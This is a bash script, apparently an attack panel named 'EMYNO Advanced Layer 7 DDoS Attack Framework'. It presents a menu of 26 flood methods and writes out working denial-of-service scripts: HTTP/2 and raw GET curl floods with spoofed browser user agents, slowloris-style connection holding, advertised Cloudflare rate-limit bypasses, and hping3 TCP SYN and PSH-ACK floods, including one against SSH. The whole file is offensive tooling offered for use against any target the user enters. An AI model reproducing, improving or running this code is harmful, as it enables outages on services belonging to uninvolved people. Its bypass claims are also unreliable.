#!/bin/bash

set -euo pipefail

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Fonction pour afficher le header
show_header() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                                                                      ║
    ║        ███████╗███╗   ███╗██╗   ██╗███╗   ██╗ ██████╗              ║
    ║        ██╔════╝████╗ ████║╚██╗ ██╔╝████╗ ██║██╔═══██╗             ║
    ║        █████╗  ██╔████╔██║ ╚████╔╝ ██╔██╗██║██║   ██║             ║
    ║        ██╔══╝  ██║╚██╔╝██║  ╚██╔╝  ██║╚████║██║   ██║             ║
    ║        ███████╗██║ ╚═╝ ██║   ██║   ██║ ╚███║╚██████╔╝             ║
    ║        ╚══════╝╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚══╝ ╚═════╝              ║
    ║                                                                      ║
    ║           Advanced Layer 7 DDoS Attack Framework v2.0                ║
    ║                                                                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Fonction pour afficher le menu principal
show_menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║${NC} ${GREEN}Select Attack Method:${NC}                                               ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 7 (HTTP/HTTPS) ATTACKS:${NC}                                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}Browser Emulation:${NC}                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[1]${NC}  browser          - HTTP/2/3 Flood (Chrome/Firefox Emulation)  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[2]${NC}  browser-vip      - Browser VIP Attack (Premium)                ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[3]${NC}  h2-zero          - HTTP/2 Flood (UAM Bypass)                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[4]${NC}  h2-zerov2        - HTTP/2 Zero V2 (Enhanced)                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[5]${NC}  rapid-zero       - HTTP/2/3 Flood (Chrome/Firefox)              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[6]${NC}  rapid-zero-priv  - Rapid Zero Private                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}HTTP/2 Raw:${NC}                                                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[7]${NC}  h2-raw           - HTTP/2 Raw Flood (High RPS)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[8]${NC}  h2-rawgeo        - HTTP/2 Raw Geo Flood                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[9]${NC}  h2f              - HTTP/2 Flood (Standard)                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[10]${NC} h2f-priv         - HTTP/2 Flood Private                        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}HTTP Raw GET:${NC}                                                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[11]${NC} http-free        - Free HTTP Flood                             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[12]${NC} http-raw         - RAW GET Flood (Low Bypass)                   ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[13]${NC} http-raw-priv    - RAW GET Flood Private                       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}Zero Attacks:${NC}                                                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[14]${NC} zero             - HTTP/2 Flooder (Ratelimit)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[15]${NC} zero-bypass      - Bypassing All Sites (No Request Capture)    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[16]${NC} zero-rst         - Zero RST (Cloudflare Custom Rule Bypass)    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[17]${NC} zero-rstgeo      - Zero RST Geo                                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[18]${NC} zerov2           - HTTP/2 Flooder (Ratelimit Bypass)            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC} ${MAGENTA}VHold:${NC}                                                             ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[19]${NC} vhold            - Method for Holding Sites (Max 10 conc)       ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[20]${NC} vholdv2          - VHold V2 (Enhanced)                         ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}LAYER 4 (TCP) ATTACKS - Restricted (No UDP, No Ports 80/443):${NC}        ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[21]${NC} tcp              - High PPS TCP Flood (Non-80/443)              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[22]${NC} tcp-bot          - TCP Bot Attack (Non-80/443)                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[23]${NC} tcp-pshack       - TCP PSH + ACK (Non-80/443)                    ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[24]${NC} tcprand          - TCP Random (Non-80/443)                      ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[25]${NC} sshkill          - SSH Kill Attack                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[26]${NC} sshkill-bot      - SSH Kill Bot                                 ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║${NC} ${CYAN}UTILITIES:${NC}                                                          ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}                                                                  ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[99]${NC} View Active Attacks                                            ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[98]${NC} Stop All Attacks                                              ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[97]${NC} Test Connection                                               ${WHITE}║${NC}"
    echo -e "${WHITE}║${NC}  ${YELLOW}[0]${NC}  Exit                                                           ${WHITE}║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Fonction pour demander les paramètres d'attaque
get_attack_params() {
    local method=$1
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Attack Parameters: ${method}${NC}                                        ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "$(echo -e ${YELLOW}Target IP/Host:${NC} ) " TARGET
    read -p "$(echo -e ${YELLOW}Port [default: 443 for L7, custom for L4]:${NC} ) " PORT
    PORT=${PORT:-443}
    
    read -p "$(echo -e ${YELLOW}Duration in seconds [default: 60]:${NC} ) " DURATION
    DURATION=${DURATION:-60}
    
    read -p "$(echo -e ${YELLOW}Threads/Connections [default: 1000]:${NC} ) " THREADS
    THREADS=${THREADS:-1000}
    
    # Vérifier restriction L4 sur ports 80/443
    if [[ "$method" =~ ^(tcp|tcp-bot|tcp-pshack|tcprand|sshkill|sshkill-bot)$ ]]; then
        if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
            echo -e "${RED}╔══════════════════════════════════════════════════════════════════════╗${NC}"
            echo -e "${RED}║${NC} ${BOLD}ERROR: L4 attacks on ports 80 and 443 are FORBIDDEN!${NC}                    ${RED}║${NC}"
            echo -e "${RED}╚══════════════════════════════════════════════════════════════════════╝${NC}"
            read -p "Press Enter to continue..."
            return 1
        fi
    fi
    
    read -p "$(echo -e ${YELLOW}Additional options [optional, e.g. --rate-limit 100]:${NC} ) " OPTIONS
    
    export TARGET PORT DURATION THREADS OPTIONS
    return 0
}

# Fonction pour créer un script L7 performant
create_l7_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    case "$method" in
        browser|browser-vip|h2-zero|h2-zerov2|rapid-zero|rapid-zero-priv)
            create_h2_browser_script "$method"
            ;;
        h2-raw|h2-rawgeo|h2f|h2f-priv)
            create_h2_raw_script "$method"
            ;;
        http-raw|http-raw-priv|http-free)
            create_http_raw_script "$method"
            ;;
        zero|zerov2|zero-bypass|zero-rst|zero-rstgeo)
            create_zero_script "$method"
            ;;
        vhold|vholdv2)
            create_vhold_script "$method"
            ;;
        *)
            create_generic_l7_script "$method"
            ;;
    esac
}

# Script HTTP/2 Browser Emulation (performant)
create_h2_browser_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
TIMEOUT=$((DURATION + 10))
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"

# User agents rotatifs pour simuler de vrais navigateurs
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# Fonction d'attaque HTTP/2 avec curl
attack_h2() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    local ua_idx=$((tid % ${#UA_LIST[@]}))
    local ua="${UA_LIST[$ua_idx]}"
    
    while [ $(date +%s) -lt $end_time ]; do
        curl -s -k -m 1 \
            --http2 \
            --http2-prior-knowledge \
            -H "User-Agent: $ua" \
            -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
            -H "Accept-Language: en-US,en;q=0.5" \
            -H "Accept-Encoding: gzip, deflate, br" \
            -H "Connection: keep-alive" \
            -H "Upgrade-Insecure-Requests: 1" \
            -H "Sec-Fetch-Dest: document" \
            -H "Sec-Fetch-Mode: navigate" \
            -H "Sec-Fetch-Site: none" \
            -H "Cache-Control: max-age=0" \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        # Limiter le nombre de processus simultanés
        if [ $(jobs -r | wc -l) -gt 50 ]; then
            wait
        fi
    done
}

# Lancer les threads
for i in $(seq 1 $THREADS); do
    attack_h2 $i &
    sleep 0.01
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script HTTP/2 Raw (haute performance)
create_h2_raw_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
TIMEOUT=$((DURATION + 10))
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

echo "[$METHOD] Starting high RPS attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"

# Attaque HTTP/2 brute force avec curl
attack_raw() {
    local tid=$1
    local end_time=$(($(date +%s) + DURATION))
    
    while [ $(date +%s) -lt $end_time ]; do
        for i in {1..10}; do
            curl -s -k -m 0.5 \
                --http2 \
                --http2-prior-knowledge \
                --no-keepalive \
                "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        done
        
        # Contrôle du nombre de processus
        if [ $(jobs -r | wc -l) -gt 100 ]; then
            wait -n
        fi
    done
}

for i in $(seq 1 $THREADS); do
    attack_raw $i &
    sleep 0.005
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script HTTP Raw GET
create_http_raw_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-80}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="http"
[ "$PORT" = "443" ] && PROTOCOL="https"

echo "[$METHOD] Starting RAW GET flood on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"

# Attaque GET brute
attack_get() {
    local end_time=$(($(date +%s) + DURATION))
    
    while [ $(date +%s) -lt $end_time ]; do
        curl -s -k -m 1 \
            --no-keepalive \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        if [ $(jobs -r | wc -l) -gt 200 ]; then
            wait -n
        fi
    done
}

for i in $(seq 1 $THREADS); do
    attack_get &
    sleep 0.01
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script Zero (bypass ratelimit)
create_zero_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

echo "[$METHOD] Starting ratelimit bypass attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s"

# Slowloris-like avec HTTP/2
if command -v slowloris &> /dev/null; then
    slowloris "$TARGET" -p "$PORT" -s "$THREADS" -t "$DURATION" $OPTIONS
else
    # Implémentation manuelle
    attack_zero() {
        local end_time=$(($(date +%s) + DURATION))
        while [ $(date +%s) -lt $end_time ]; do
            curl -s -k -m 10 \
                --http2 \
                --max-time 10 \
                --keepalive-time 10 \
                "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
            sleep 0.1
        done
    }
    
    for i in $(seq 1 $THREADS); do
        attack_zero &
    done
    wait
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script VHold (holding connections)
create_vhold_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-7200}
THREADS=${4:-10}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

# VHold: max 10 connections, 7200s timelimit
THREADS=$((THREADS > 10 ? 10 : THREADS))
DURATION=$((DURATION > 7200 ? 7200 : DURATION))

echo "[$METHOD] Holding connections on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS connections"

# Maintenir les connexions ouvertes
hold_connection() {
    local end_time=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $end_time ]; do
        curl -s -k -m "$DURATION" \
            --http2 \
            --max-time "$DURATION" \
            --no-buffer \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 || true
        sleep 1
    done
}

for i in $(seq 1 $THREADS); do
    hold_connection &
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Script générique L7
create_generic_l7_script() {
    local method=$1
    cat > "/opt/discord.cool/attacks/l7_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-443}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"
PROTOCOL="https"
[ "$PORT" = "80" ] && PROTOCOL="http"

echo "[$METHOD] Starting attack on $PROTOCOL://$TARGET:$PORT for ${DURATION}s with $THREADS threads"

attack_generic() {
    local end_time=$(($(date +%s) + DURATION))
    while [ $(date +%s) -lt $end_time ]; do
        curl -s -k -m 1 \
            --http2 \
            "$PROTOCOL://$TARGET:$PORT/" > /dev/null 2>&1 &
        
        if [ $(jobs -r | wc -l) -gt 100 ]; then
            wait -n
        fi
    done
}

for i in $(seq 1 $THREADS); do
    attack_generic &
    sleep 0.01
done

wait
echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l7_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l7_${method}.sh"
}

# Fonction pour créer un script L4 performant
create_l4_script() {
    local method=$1
    mkdir -p /opt/discord.cool/attacks
    
    cat > "/opt/discord.cool/attacks/l4_${method}.sh" << 'SCRIPT_EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-8080}
DURATION=${3:-60}
THREADS=${4:-1000}
OPTIONS=$5

METHOD="METHOD_NAME"

# Vérification restriction ports 80/443
if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
    echo "ERROR: L4 attacks on ports 80 and 443 are forbidden!"
    exit 1
fi

echo "[$METHOD] Starting attack on $TARGET:$PORT for ${DURATION}s with $THREADS threads"

if command -v hping3 &> /dev/null; then
    case "$METHOD" in
        tcp|tcp-bot)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
        tcp-pshack)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -A -P -F -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
        tcprand)
            for i in $(seq 1 $THREADS); do
                RAND_PORT=$((RANDOM % 65535 + 1))
                timeout "$DURATION" hping3 -S -p "$RAND_PORT" -i u1000 "$TARGET" &
            done
            ;;
        sshkill|sshkill-bot)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -p 22 -i u500 "$TARGET" &
            done
            ;;
        *)
            for i in $(seq 1 $THREADS); do
                timeout "$DURATION" hping3 -S -p "$PORT" -i u1000 "$TARGET" &
            done
            ;;
    esac
    wait
else
    echo "hping3 not found, install it first: apt install hping3"
    exit 1
fi

echo "[$METHOD] Attack completed"
SCRIPT_EOF
    
    sed -i "s/METHOD_NAME/$method/g" "/opt/discord.cool/attacks/l4_${method}.sh"
    chmod +x "/opt/discord.cool/attacks/l4_${method}.sh"
}

# Fonction pour lancer une attaque L7
launch_l7_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l7_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${YELLOW}Creating optimized script for ${method}...${NC}"
        create_l7_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    echo $! > "/tmp/emyno_${method}.pid"
    echo -e "${GREEN}Attack started! PID: $(cat /tmp/emyno_${method}.pid)${NC}"
}

# Fonction pour lancer une attaque L4
launch_l4_attack() {
    local method=$1
    local script_path="/opt/discord.cool/attacks/l4_${method}.sh"
    
    if [ ! -f "$script_path" ]; then
        echo -e "${YELLOW}Creating optimized script for ${method}...${NC}"
        create_l4_script "$method"
    fi
    
    echo -e "${GREEN}Launching ${method} attack...${NC}"
    bash "$script_path" "$TARGET" "$PORT" "$DURATION" "$THREADS" "$OPTIONS" &
    echo $! > "/tmp/emyno_${method}.pid"
    echo -e "${GREEN}Attack started! PID: $(cat /tmp/emyno_${method}.pid)${NC}"
}

# Fonction pour voir les attaques actives
view_active_attacks() {
    clear
    show_header
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} ${BOLD}Active Attacks${NC}                                                         ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local found=false
    for pidfile in /tmp/emyno_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            local method=$(basename "$pidfile" | sed 's/emyno_//;s/.pid//')
            if ps -p "$pid" > /dev/null 2>&1; then
                found=true
                local runtime=$(ps -o etime= -p "$pid" 2>/dev/null | tr -d ' ')
                echo -e "${GREEN}[ACTIVE]${NC} Method: ${YELLOW}$method${NC} | PID: $pid | Runtime: $runtime"
            else
                rm -f "$pidfile"
            fi
        fi
    done
    
    if [ "$found" = false ]; then
        echo -e "${YELLOW}No active attacks${NC}"
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Fonction pour arrêter toutes les attaques
stop_all_attacks() {
    echo -e "${RED}Stopping all attacks...${NC}"
    for pidfile in /tmp/emyno_*.pid; do
        if [ -f "$pidfile" ]; then
            local pid=$(cat "$pidfile")
            if ps -p "$pid" > /dev/null 2>&1; then
                kill "$pid" 2>/dev/null && echo -e "${GREEN}Stopped PID: $pid${NC}"
            fi
            rm -f "$pidfile"
        fi
    done
    pkill -f "l7_.*\.sh" 2>/dev/null
    pkill -f "l4_.*\.sh" 2>/dev/null
    pkill -f "curl.*$TARGET" 2>/dev/null || true
    echo -e "${GREEN}All attacks stopped${NC}"
    sleep 2
}

# Fonction pour tester la connexion
test_connection() {
    read -p "$(echo -e ${YELLOW}Target to test:${NC} ) " test_target
    echo -e "${CYAN}Testing connection to $test_target...${NC}"
    
    if timeout 5 curl -s -k -m 3 "https://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTPS connection successful${NC}"
    elif timeout 5 curl -s -m 3 "http://$test_target" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ HTTP connection successful${NC}"
    else
        echo -e "${RED}✗ Connection failed${NC}"
    fi
    
    read -p "Press Enter to continue..."
}

# Main loop
main() {
    while true; do
        show_header
        show_menu
        echo ""
        read -p "$(echo -e ${BOLD}${GREEN}Select option:${NC} ) " choice
        
        case $choice in
            1) get_attack_params "browser" && launch_l7_attack "browser" ;;
            2) get_attack_params "browser-vip" && launch_l7_attack "browser-vip" ;;
            3) get_attack_params "h2-zero" && launch_l7_attack "h2-zero" ;;
            4) get_attack_params "h2-zerov2" && launch_l7_attack "h2-zerov2" ;;
            5) get_attack_params "rapid-zero" && launch_l7_attack "rapid-zero" ;;
            6) get_attack_params "rapid-zero-priv" && launch_l7_attack "rapid-zero-priv" ;;
            7) get_attack_params "h2-raw" && launch_l7_attack "h2-raw" ;;
            8) get_attack_params "h2-rawgeo" && launch_l7_attack "h2-rawgeo" ;;
            9) get_attack_params "h2f" && launch_l7_attack "h2f" ;;
            10) get_attack_params "h2f-priv" && launch_l7_attack "h2f-priv" ;;
            11) get_attack_params "http-free" && launch_l7_attack "http-free" ;;
            12) get_attack_params "http-raw" && launch_l7_attack "http-raw" ;;
            13) get_attack_params "http-raw-priv" && launch_l7_attack "http-raw-priv" ;;
            14) get_attack_params "zero" && launch_l7_attack "zero" ;;
            15) get_attack_params "zero-bypass" && launch_l7_attack "zero-bypass" ;;
            16) get_attack_params "zero-rst" && launch_l7_attack "zero-rst" ;;
            17) get_attack_params "zero-rstgeo" && launch_l7_attack "zero-rstgeo" ;;
            18) get_attack_params "zerov2" && launch_l7_attack "zerov2" ;;
            19) get_attack_params "vhold" && launch_l7_attack "vhold" ;;
            20) get_attack_params "vholdv2" && launch_l7_attack "vholdv2" ;;
            21) get_attack_params "tcp" && launch_l4_attack "tcp" ;;
            22) get_attack_params "tcp-bot" && launch_l4_attack "tcp-bot" ;;
            23) get_attack_params "tcp-pshack" && launch_l4_attack "tcp-pshack" ;;
            24) get_attack_params "tcprand" && launch_l4_attack "tcprand" ;;
            25) get_attack_params "sshkill" && launch_l4_attack "sshkill" ;;
            26) get_attack_params "sshkill-bot" && launch_l4_attack "sshkill-bot" ;;
            99) view_active_attacks ;;
            98) stop_all_attacks ;;
            97) test_connection ;;
            0) 
                stop_all_attacks
                echo -e "${GREEN}Goodbye!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option!${NC}"
                sleep 1
                ;;
        esac
        
        if [ $? -eq 0 ] && [ "$choice" -ge 1 ] && [ "$choice" -le 43 ]; then
            echo ""
            read -p "$(echo -e ${YELLOW}Press Enter to continue...${NC})"
        fi
    done
}

# Run main
main

